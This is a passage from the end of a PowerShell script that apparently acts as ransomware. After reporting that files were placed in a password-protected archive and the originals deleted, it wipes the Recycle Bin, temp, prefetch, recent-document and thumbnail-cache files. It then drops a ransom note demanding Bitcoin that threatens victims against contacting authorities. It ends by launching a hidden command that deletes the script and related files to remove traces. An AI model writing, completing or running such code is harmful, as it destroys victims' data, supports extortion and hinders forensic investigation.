        Write-Status "Emptying Recycle Bin..." -Type Info

        # Method 1: Using Shell.Application COM object
        try {
            $shell = New-Object -ComObject Shell.Application
            $recycleBin = $shell.Namespace(0xA)
            $recycleBin.Items() | ForEach-Object {
                Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue
            }
            Write-Status "Recycle Bin emptied successfully" -Type Success
        } catch {
            # Method 2: Direct file system approach
            Write-Status "Using alternate method to empty Recycle Bin..." -Type Info
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match '^[A-Z]:\\$' }
            foreach ($drive in $drives) {
                $recycleBinPath = Join-Path $drive.Root '$Recycle.Bin'
                if (Test-Path $recycleBinPath) {
                    Get-ChildItem -Path $recycleBinPath -Force -Recurse -ErrorAction SilentlyContinue |
                        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
            Write-Status "Recycle Bin cleanup completed" -Type Success
        }
    } catch {
        Write-Status "Could not empty Recycle Bin: $($_.Exception.Message)" -Type Warning
    }

    # Clear Windows temp files in background
    Write-Status "Starting temp file cleanup in background..." -Type Info
    $cleanupJob = Start-Job -ScriptBlock {
        try {
            # Clear user temp
            Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

            # Clear system temp
            Get-ChildItem -Path "$env:SystemRoot\Temp" -Recurse -Force -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            # Silently continue
        }
    }

    # Clear prefetch files
    try {
        Write-Status "Clearing prefetch files..." -Type Info
        $prefetchPath = Join-Path $env:SystemRoot "Prefetch"
        if (Test-Path $prefetchPath) {
            Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Status "Prefetch files cleared" -Type Success
        }
    } catch {
        Write-Status "Could not clear prefetch files (may require admin privileges)" -Type Warning
    }

    # Clear recent documents
    try {
        Write-Status "Clearing recent documents..." -Type Info
        $recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
        if (Test-Path $recentPath) {
            Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            Write-Status "Recent documents cleared" -Type Success
        }
    } catch {
        Write-Status "Could not clear recent documents" -Type Warning
    }

    # Clear thumbnail cache
    try {
        Write-Status "Clearing thumbnail cache..." -Type Info
        $thumbCachePath = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\Explorer"
        if (Test-Path $thumbCachePath) {
            Get-ChildItem -Path $thumbCachePath -Filter "thumbcache_*.db" -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Status "Thumbnail cache cleared" -Type Success
        }
    } catch {
        # Non-critical
    }

    # Run Disk Cleanup utility in background (if available)
    try {
        if (Get-Command cleanmgr.exe -ErrorAction SilentlyContinue) {
            Write-Status "Starting Windows Disk Cleanup in background..." -Type Info
            Start-Process cleanmgr.exe -ArgumentList "/sagerun:1" -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {
        # Non-critical
    }

    Write-Status "System cleanup processes initiated" -Type Success

    # Final summary
    Write-Host ""
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host "Operation Complete" -ForegroundColor Cyan
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host "[+] Encrypted archive: $archivePath" -ForegroundColor Green
    Write-Host "[+] Password: $Password" -ForegroundColor Green
    Write-Host "[+] Original files have been deleted" -ForegroundColor Green
    Write-Host "[+] System cleanup processes started" -ForegroundColor Green
    Write-Host ""
    Write-Host "[*] To extract files, use:" -ForegroundColor Cyan
    Write-Host "    7z x $ArchiveName -p$Password" -ForegroundColor Yellow
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host ""

    # Create ransom note
    $ransomNote = @"
============================================================================
YOUR FILES HAVE BEEN ENCRYPTED
============================================================================

All your files have been encrypted with military-grade encryption.
To decrypt your files, you must pay the ransom.

Contact: darkweb@onion.com
Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, you will receive the decryption key.
DO NOT attempt to decrypt files yourself or contact authorities.
This will result in permanent data loss.

You have 48 hours to comply.
============================================================================
"@

    $ransomNote | Out-File -FilePath (Join-Path $CurrentDir "README_IMPORTANT.txt") -Encoding ASCII
    Write-Status "Ransom note created: README_IMPORTANT.txt" -Type Success

    # Self-delete the script - using inline command (no temp files)
    Write-Status "Removing script traces..." -Type Info

    $scriptToDelete = $MyInvocation.MyCommand.Path
    $scriptDir = Split-Path -Parent $scriptToDelete

    if ($DebugMode) {
        Write-Host "[DEBUG] Script path: $scriptToDelete" -ForegroundColor Magenta
        Write-Host "[DEBUG] Script directory: $scriptDir" -ForegroundColor Magenta
    }

    # Use inline CMD command to delete after script exits - SIMPLE & RELIABLE
    $deleteCmd = "timeout /t 2 /nobreak >nul & del /f /q `"$scriptToDelete`" 2>nul & cd /d `"$scriptDir`" & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul & rd /s /q %SYSTEMDRIVE%\`$Recycle.Bin 2>nul"
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $deleteCmd" -WindowStyle Hidden

    if ($DebugMode) { Write-Host "[DEBUG] Self-delete command launched" -ForegroundColor Magenta }

} catch {
    Write-Host ""
    Write-Status "ERROR: $($_.Exception.Message)" -Type Error
    Write-Status "Operation aborted" -Type Error
    exit 1
}

# Exit immediately without pause
exit 0
